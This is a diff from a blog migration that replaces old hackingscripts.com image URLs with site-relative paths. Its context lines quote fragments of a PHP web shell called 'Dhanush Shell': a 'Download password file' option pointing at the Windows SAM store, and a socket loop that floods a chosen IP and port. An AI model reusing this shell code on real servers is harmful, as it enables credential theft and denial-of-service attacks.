@@ -1037,7 +1037,7 @@ return $info;
 	function  safe()
 	{
 		global $sm;
-		return $sm?"ON <img src="http://hackingscripts.com/wp/wp-includes/images/smilies/icon_sad.gif" alt=":(" class="wp-smiley" /> :'((MostoftheFeatureswillNotWork!) ":"OFF";
+		return $sm?"ON <img src="{{ site.baseurl }}/wp-includes/images/smilies/icon_sad.gif" alt=":(" class="wp-smiley" /> :'((MostoftheFeatureswillNotWork!) ":"OFF";
 	}
 	function serveradmin()
 	{
@@ -4982,7 +4982,7 @@ epair\sam&gt;&lt;b&gt;&lt;font class=txt&gt;Download password file&lt;/font&gt;&
                     
                     echo "Sending Data :- &lt;br /&gt; &lt;p align='center'&gt;$data&lt;/p&gt;";
                     
-                    print "I am at ma Work now <img src="http://hackingscripts.com/wp/wp-includes/images/smilies/icon_biggrin.gif" alt=":D" class="wp-smiley" /> ;D! Dont close this window untill you recieve a message &lt;br&gt;";
+                    print "I am at ma Work now <img src="{{ site.baseurl }}/wp-includes/images/smilies/icon_biggrin.gif" alt=":D" class="wp-smiley" /> ;D! Dont close this window untill you recieve a message &lt;br&gt;";
                     for($i=0;$i&lt;$times;$i++)
                     {
                     $socket = fsockopen("$mode://$IP", $port, $error, $errorString, $timeout);
@@ -5089,7 +5089,7 @@ epair\sam&gt;&lt;b&gt;&lt;font class=txt&gt;Download password file&lt;/font&gt;&
                     $data .= "X";
                     }
                     $data .= " Dhanush";
-                    print "I am at ma Work now <img src="http://hackingscripts.com/wp/wp-includes/images/smilies/icon_biggrin.gif" alt=":D" class="wp-smiley" /> ;D! Dont close this window untill you recieve a message &lt;br&gt;";
+                    print "I am at ma Work now <img src="{{ site.baseurl }}/wp-includes/images/smilies/icon_biggrin.gif" alt=":D" class="wp-smiley" /> ;D! Dont close this window untill you recieve a message &lt;br&gt;";
                     
                     while(1)
                     {
@@ -5851,6 +5851,6 @@ epair\sam&gt;&lt;b&gt;&lt;font class=txt&gt;Download password file&lt;/font&gt;&
 
 ## Dhanush Shell screenshot<figure id="attachment_447" style="width: 604px;" class="wp-caption aligncenter">
 
-[<img src="http://hackingscripts.com/wp/wp-content/uploads/2014/02/dhanush-shell-1024x658.png" alt="Dhanush shell screenshot" width="604" height="388" class="size-large wp-image-447" />][1]<figcaption class="wp-caption-text">Dhanush shell screenshot</figcaption></figure>
+[<img src="{{ site.baseurl }}/wp-content/uploads/2014/02/dhanush-shell-1024x658.png" alt="Dhanush shell screenshot" width="604" height="388" class="size-large wp-image-447" />][1]<figcaption class="wp-caption-text">Dhanush shell screenshot</figcaption></figure>
 
- [1]: http://hackingscripts.com/wp/wp-content/uploads/2014/02/dhanush-shell.png
+ [1]: {{ site.baseurl }}/wp-content/uploads/2014/02/dhanush-shell.png
